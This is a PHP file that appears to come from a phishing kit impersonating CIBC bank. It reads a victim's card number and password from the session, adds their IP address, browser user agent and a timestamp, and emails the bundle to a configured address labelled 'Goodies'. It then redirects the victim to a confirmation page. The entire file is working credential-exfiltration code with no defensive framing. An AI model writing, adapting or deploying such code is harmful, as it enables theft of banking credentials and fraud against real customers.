<?php
session_start();

include "youremail.php";
include "blocker.php";

$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");


$cc1 = $_SESSION['id'];
$pp = $_SESSION['pass'];
$data ="
=============## CIBC LOGIN ##==================
|USER : $cc1
|PASS : $pp
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="#CIBC #$ip";
 if (strlen($cc1) == 16 && strlen($pp) <= 20 ) {
   mail($emailusr, $subj, $data);	
   }


	

header("Location: ./confirm.php");

?>